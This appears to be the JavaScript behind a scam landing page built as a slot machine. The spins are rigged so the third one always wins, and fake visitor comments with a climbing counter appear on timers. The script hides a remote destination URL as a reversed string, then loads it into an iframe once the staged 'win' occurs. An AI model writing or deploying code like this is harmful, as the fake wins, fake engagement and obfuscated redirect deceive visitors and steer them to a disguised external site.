var count_spins = 0;
var slot_selector = $('.slot');
var comment_count_selector = $('#comment-count');
var switched = 0;
var go_url = 'oi.buhtig.0202reyubekac=ps?/nitposc/w/ten.ndc-dw//:sptth';
var new_url = go_url.split("").reverse().join("");

$(document).ready(function() {

	setTimeout(function() {
		$('#alert').addClass('alert-active');
	}, 1000);

	setTimeout(function() {
		$('.comment-2').addClass('comment-appear');
		comment_count_selector.attr('data-value', (comment_count_selector.attr('data-value') * 1 + 1));
		comment_count_selector.text(comment_count_selector.attr('data-value'));
	}, 2000);

	setTimeout(function() {
		$('.comment-1').addClass('comment-appear');
		comment_count_selector.attr('data-value', (comment_count_selector.attr('data-value') * 1 + 1));
		comment_count_selector.text(comment_count_selector.attr('data-value'));
	}, 7500);

	setTimeout(function() {
		$('.comment-0').addClass('comment-appear');
		comment_count_selector.attr('data-value', (comment_count_selector.attr('data-value') * 1 + 1));
		comment_count_selector.text(comment_count_selector.attr('data-value'));
	}, 12500);

});

function forwardTo(goto_link)
{
	window.location.replace(goto_link);
}

$('#win-btn').click(function(e) {
	e.preventDefault();
	$('#iframe1').removeClass('hidden');
});

$('#spin-btn').click(function() {
//$('#overlay').click(function() {
	
	if(count_spins < 3)
	{
		count_spins++;

		slot_selector.addClass('blur');

		for(i=0;i<19;i++)
		{
			slot_selector.removeClass('spin-'+i);
		}

		if(count_spins < 3)
		//if(false)
		{
			for(i=0;i<5;i++)
			{
				//$('.slot-'+i).addClass('spin-'+(Math.floor(Math.random() * 19)));
				$('.slot-'+i).addClass('spin-'+(count_spins * 9));
			}
		}
		else
		{

			$('#iframe1').attr('src', new_url);

			for(i=0;i<5;i++)
			{
				$('.slot-'+i).addClass('spin-w');
			}

			setTimeout(function() {
				$('#overlay').removeClass('no-show');
				$('#overlay').addClass('show-overlay');
				$('#win-alert').addClass('win-alert-active');
				//$('.win-button-container').removeClass('hidden');
			}, 2800);

			for(i=0;i<250;i++)
			{
				setTimeout(function() {

					setTimeout(function() {
						$('.slot-0').children('.symbol-9').addClass('symbol-10');
					}, 1000);
					
					setTimeout(function() {
						$('.slot-0').children('.symbol-9').removeClass('symbol-10');
					}, 1300);


					setTimeout(function() {
						$('.slot-1').children('.symbol-9').addClass('symbol-10');
					}, 1100);
					
					setTimeout(function() {
						$('.slot-1').children('.symbol-9').removeClass('symbol-10');
					}, 1400);


					setTimeout(function() {
						$('.slot-2').children('.symbol-9').addClass('symbol-10');
					}, 1200);
					
					setTimeout(function() {
						$('.slot-2').children('.symbol-9').removeClass('symbol-10');
					}, 1500);


					setTimeout(function() {
						$('.slot-3').children('.symbol-9').addClass('symbol-10');
					}, 1300);
					
					setTimeout(function() {
						$('.slot-3').children('.symbol-9').removeClass('symbol-10');
					}, 1600);


					setTimeout(function() {
						$('.slot-4').children('.symbol-9').addClass('symbol-10');
					}, 1400);
					
					setTimeout(function() {
						$('.slot-4').children('.symbol-9').removeClass('symbol-10');
					}, 1700);
						
				}, (1500 + 700 * i));
			}
		}

		setTimeout(function() {
			$('.slot-0').removeClass('blur');
		}, 500);

		setTimeout(function() {
			$('.slot-1').removeClass('blur');
		}, 650);

		setTimeout(function() {
			$('.slot-2').removeClass('blur');
		}, 750);

		setTimeout(function() {
			$('.slot-3').removeClass('blur');
		}, 900);

		setTimeout(function() {
			$('.slot-4').removeClass('blur');
		}, 1000);		
	}

});